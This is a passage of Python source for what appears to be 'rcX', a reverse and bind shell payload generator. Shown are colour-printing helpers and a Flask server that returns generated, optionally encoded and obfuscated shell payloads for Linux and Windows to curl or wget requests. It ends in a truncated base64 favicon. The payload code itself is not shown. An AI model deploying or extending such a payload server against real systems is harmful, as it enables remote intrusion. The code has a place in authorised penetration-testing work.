            title = []
            for _ in data:
                title.append(self.RandomColoring(_))
            title = " - ".join(title)
        else:
            title = self.RandomColoring(data)
        return title

    def format(self, text=None, title=False, web=False):
        result = ""
        if title and not web:
            if isinstance(text, list):
                result = []
                for _ in text:
                    result.append(self.RandomColoring(_))
                result = " - ".join(result)
            else:
                result = text
        elif title and web:
            if isinstance(text, list):
                result = []
                for _ in text:
                    result.append(self.RandomColoring(_, web=True))
                result = "<h5>" + " - ".join(result) + "</h5>"
            else:
                result = self.RandomColoring(text)
        elif web:
            if isinstance(text, dict):
                i = 0
                for key, value in text.items():
                    i += 1
                    result += "<h5>" + str(i) + '.' + key + "</h5>" + "<div><pre>" + str(value) + "</pre></div>"
                # result = '''<pre class="ng-binding">''' + result + "</pre>"
        else:
            if isinstance(text, dict):
                i = 0
                for key, value in text.items():
                    i += 1
                    result += self.RandomColoring(str(i) + '.' + key) + "\n" + value + "\n"
        return result

    def printTable(self, payloads=None):
        if isinstance(payloads, dict):
            try:
                width = __import__('os').get_terminal_size().columns
            except AttributeError:
                width = 100
                pass
            # Payload Table
            from prettytable import PrettyTable
            PayloadTable = PrettyTable(["", "Name", "Payload"])
            # PayloadTable.max_width = width
            PayloadTable._max_width = {"Name": 40, "Payload": width - 50}
            PayloadTable.align = "l"
            # PayloadTable.set_style(PLAIN_COLUMNS)
            num = 0
            for name, payload in payloads.items():
                num += 1
                if isinstance(payload, list):
                    PayloadTable.add_row([num, self.RandomColoring(name), '\n'.join(payload)])
                else:
                    PayloadTable.add_row([num, self.RandomColoring(name), payload])

        print(PayloadTable)

    @staticmethod
    def red(text):
        return "\033[31m{}\033[0m".format(text)

    @staticmethod
    def green(text):
        return "\033[32m{}\033[0m".format(text)

    @staticmethod
    def yellow(text):
        return "\033[33m{}\033[0m".format(text)

    @staticmethod
    def blue(text):
        return "\033[34m{}\033[0m".format(text)

    @staticmethod
    def magenta(text):
        return "\033[35m{}\033[0m".format(text)

    @staticmethod
    def cyan(text):
        return "\033[36m{}\033[0m".format(text)

    @staticmethod
    def white(text):
        return "\033[37m{}\033[0m".format(text)

    @staticmethod
    def bright_red(text):
        return "\033[91m{}\033[0m".format(text)

    @staticmethod
    def bright_green(text):
        return "\033[92m{}\033[0m".format(text)

    @staticmethod
    def bright_yellow(text):
        return "\033[93m{}\033[0m".format(text)

    @staticmethod
    def bright_blue(text):
        return "\033[94m{}\033[0m".format(text)

    @staticmethod
    def bright_magenta(text):
        return "\033[95m{}\033[0m".format(text)

    @staticmethod
    def bright_cyan(text):
        return "\033[96m{}\033[0m".format(text)

    @staticmethod
    def bright_white(text):
        return "\033[97m{}\033[0m".format(text)

    @staticmethod
    def underline(text):
        return "\033[4m{}\033[0m".format(text)


def create_app(host="127.0.0.1", port=80, debug=False):
    from flask import request, Flask

    class localFlask(Flask):
        def process_response(self, response):
            response.headers['server'] = SERVER_NAME
            return response

    SERVER_NAME = 'rcX ' + __Version__
    cli = __import__('sys').modules['flask.cli']
    cli.show_server_banner = lambda *x: None
    app = localFlask(__name__)
    app.url_map.strict_slashes = False
    op = Utils()

    def web(_host, _port, shell_type, encoder, obfuscator, staging_url, staging_cmd):
        # print("args", request.view_args)
        # print("path", request.path, len(request.path[1:-1].split("/")))
        ua = ["curl", "wget", "fetch", "httpie", "lwp-request", "python-requests"]
        if any(x in request.headers["User-Agent"].lower() for x in ua):
            direction = "bind" if "bind" in request.path else "reverse"
            platform = "windows" if "windows" in request.path else "linux"
            print(encoder)
            payload = Generator(host=_host, port=_port, shell_type=shell_type,
                                direction=direction,
                                encoder=encoder, web=True,
                                platform=platform, shell_path="",
                                obfuscator=obfuscator,
                                staging_url=staging_url, staging_cmd=staging_cmd)
            result = op.title(payload[0]) + "\n" + op.format(payload[1])

            return result
        else:
            return ""

    app.add_url_rule("/bind/windows", 'bw1', web,
                     defaults={"shell_type": "netcat", "_host": "", "_port": "",
                               "encoder": "", "obfuscator": "", "staging_url": "",
                               "staging_cmd": ""})
    app.add_url_rule("/bind/windows/<shell_type>", 'bw2', web, defaults={"_host": "", "_port": "",
                                                                         "encoder": "", "obfuscator": "",

                                                                         "staging_url": "", "staging_cmd": ""})
    app.add_url_rule("/bind/windows/<shell_type>/<_host>", 'bw3', web,
                     defaults={"_port": "", "encoder": "", "obfuscator": "",
                               "staging_url": "", "staging_cmd": ""})
    app.add_url_rule("/bind/windows/<shell_type>/<_host>/<_port>", 'bw4', web,
                     defaults={"encoder": "", "obfuscator": "",
                               "staging_url": "", "staging_cmd": ""})
    app.add_url_rule("/bind/windows/<shell_type>/<_host>/<_port>/<encoder>", 'bw5', web,
                     defaults={"obfuscator": "", "staging_url": "",
                               "staging_cmd": ""})
    app.add_url_rule("/bind/windows/<shell_type>/<_host>/<_port>/<encoder>/<obfuscator>", 'bw6', web,
                     defaults={"staging_url": "", "staging_cmd": ""})
    app.add_url_rule(
        "/bind/windows/<shell_type>/<_host>/<_port>/<encoder>/<obfuscator>/<int:staging_url>/<int:staging_cmd>",
        'bw7', web)
    app.add_url_rule("/bind/linux", 'bl1', web,
                     defaults={"shell_type": "python", "_host": "", "_port": "",
                               "encoder": "", "obfuscator": "", "staging_url": "",
                               "staging_cmd": ""})
    app.add_url_rule("/bind/linux/<shell_type>", 'bl2', web,
                     defaults={"_host": "", "_port": "",
                               "encoder": "", "obfuscator": "",
                               "staging_url": "", "staging_cmd": ""})
    app.add_url_rule("/bind/linux/<shell_type>/<_host>", 'bl3', web,
                     defaults={"_port": "", "encoder": "", "obfuscator": "",
                               "staging_url": "", "staging_cmd": ""})
    app.add_url_rule("/bind/linux/<shell_type>/<_host>/<_port>", 'bl4', web,
                     defaults={"encoder": "", "obfuscator": "",
                               "staging_url": "", "staging_cmd": ""})
    app.add_url_rule("/bind/linux/<shell_type>/<_host>/<_port>/<encoder>", 'bl5', web,
                     defaults={"obfuscator": "", "staging_url": "",
                               "staging_cmd": ""})
    app.add_url_rule("/bind/linux/<shell_type>/<_host>/<_port>/<encoder>/<obfuscator>", 'bl6', web,
                     defaults={"staging_url": "", "staging_cmd": ""})
    app.add_url_rule(
        "/bind/linux/<shell_type>/<_host>/<_port>/<encoder>/<obfuscator>/<int:staging_url>/<int:staging_cmd>",
        'bl7', web)
    app.add_url_rule("/windows/", 'w1', web,
                     defaults={"shell_type": "powershell", "_host": "", "_port": "", "encoder": "", "obfuscator": "",
                               "staging_url": "", "staging_cmd": ""})
    app.add_url_rule("/windows/<shell_type>",
                     'w2', web, defaults={"_host": "", "_port": "",
                                          "encoder": "", "obfuscator": "",
                                          "staging_url": "", "staging_cmd": ""})
    app.add_url_rule("/windows/<shell_type>/<_host>",
                     'w3', web, defaults={"_port": "", "encoder": "", "obfuscator": "",
                                          "staging_url": "", "staging_cmd": ""})
    app.add_url_rule("/windows/<shell_type>/<_host>/<_port>",
                     'w4', web, defaults={"encoder": "", "obfuscator": "",
                                          "staging_url": "", "staging_cmd": ""})
    app.add_url_rule("/windows/<shell_type>/<_host>/<_port>/<encoder>",
                     'w5', web, defaults={"obfuscator": "", "staging_url": "",
                                          "staging_cmd": ""})
    app.add_url_rule("/windows/<shell_type>/<_host>/<_port>/<encoder>/<obfuscator>",
                     'w6', web, defaults={"staging_url": "", "staging_cmd": ""})
    app.add_url_rule(
        "/windows/<shell_type>/<_host>/<_port>/<encoder>/<obfuscator>/<int:staging_url>/<int:staging_cmd>",
        'w7', web)
    app.add_url_rule("/linux/",
                     'l1', web, defaults={"shell_type": "bash", "_host": "", "_port": "",
                                          "encoder": "", "obfuscator": "", "staging_url": "",
                                          "staging_cmd": ""})
    app.add_url_rule("/linux/<shell_type>",
                     'l2', web, defaults={"_host": "", "_port": "",
                                          "encoder": "", "obfuscator": "",
                                          "staging_url": "", "staging_cmd": ""})
    app.add_url_rule("/linux/<shell_type>/<_host>",
                     'l3', web, defaults={"_port": "", "encoder": "", "obfuscator": "",
                                          "staging_url": "", "staging_cmd": ""})
    app.add_url_rule("/linux/<shell_type>/<_host>/<_port>",
                     'l4', web, defaults={"encoder": "", "obfuscator": "",
                                          "staging_url": "", "staging_cmd": ""})
    app.add_url_rule("/linux/<shell_type>/<_host>/<_port>/<encoder>",
                     'l5', web, defaults={"obfuscator": "", "staging_url": "",
                                          "staging_cmd": ""})
    app.add_url_rule("/linux/<shell_type>/<_host>/<_port>/<encoder>/<obfuscator>",
                     'l6', web, defaults={"staging_url": "", "staging_cmd": ""})
    app.add_url_rule(
        "/linux/<shell_type>/<_host>/<_port>/<encoder>/<obfuscator>/<staging_url>/<staging_cmd>",
        'l7', web)

    @app.route("/gen", methods=["GET", "POST"])
    def gen():
        # print("form", request.form)
        _host = request.form.get("host")
        _port = request.form.get("port")
        shell_type = request.form.get("shell_type")
        shell_path = request.form.get("shell_path")
        encoder = request.form.get("encoder")
        if encoder:
            encoder = request.form.get("encoder").split(" ")
        elif request.form.getlist('encoder[]'):
            encoder = request.form.getlist("encoder[]")
        obfuscator = request.form.get("obfuscator")
        staging_url = request.form.get("staging_url")
        if staging_url == "100":
            staging_url = ""

        staging_cmd = request.form.get("staging_cmd")
        direction = request.form.get("direction")
        protocol = request.form.get("protocol")
        encryption = request.form.get("encryption")
        platform = request.form.get("platform")
        binary_name = request.form.get("binary_name")
        localtunnel = request.form.get("localtunnel")
        if request.host not in ["127.0.0.1", "localhost"]:
            localtunnel = ""
        if localtunnel == "ng_close":
            from pyngrok import ngrok
            ngrok.kill()

        if not direction:
            direction = "reverse"
        if not platform:
            platform = "linux"
        payload = Generator(host=_host, port=_port, shell_type=shell_type,
                            direction=direction, protocol=protocol, encryption=encryption,
                            encoder=encoder, web=True,
                            platform=platform, binary_name=binary_name,
                            shell_path=shell_path,
                            obfuscator=obfuscator,
                            staging_url=staging_url, staging_cmd=staging_cmd, localtunnel=localtunnel)
        title = None
        result = "<div class='alert alert-info' role='alert'>Oops, nothing found!</div>"
        try:
            title = op.format(payload[0], title=True, web=True)
            result = op.format(payload[1], web=True)
        except TypeError:
            pass

        return {"t": title, "r": result}

    @app.route("/", methods=["GET"])
    def index():
        ua = ["curl", "wget", "fetch", "httpie", "lwp-request", "python-requests"]
        if any(x in request.headers["User-Agent"].lower() for x in ua):
            return "It works! Try " + Utils.bright_white("curl " + request.url + "help")
        else:
            return '''<!DOCTYPE html><html lang="en"><head><link rel="shortcut icon" href="data:image/x-icon;base64,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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKAAAACAAAABAAAAAAQAgAAAAAACAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPAAAAWQAAAJwAAADNAAAA7AAAAP4AAAD+AAAA7AAAAM0AAACcAAAAWgAAAA8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAmAAAAnQAAAPYAAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA9gAAAJ0AAAAmAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKAAAAjAAAAPoAAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAPoAAACMAAAACgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJAAAANQAAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAADUAAAAJAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADQAAADsAAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAADsAAAANAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAkAAAA7AAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAADsAAAAJAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACgAAANQAAAD/AAAA/wAAAP8AAAD/AAAA/wAA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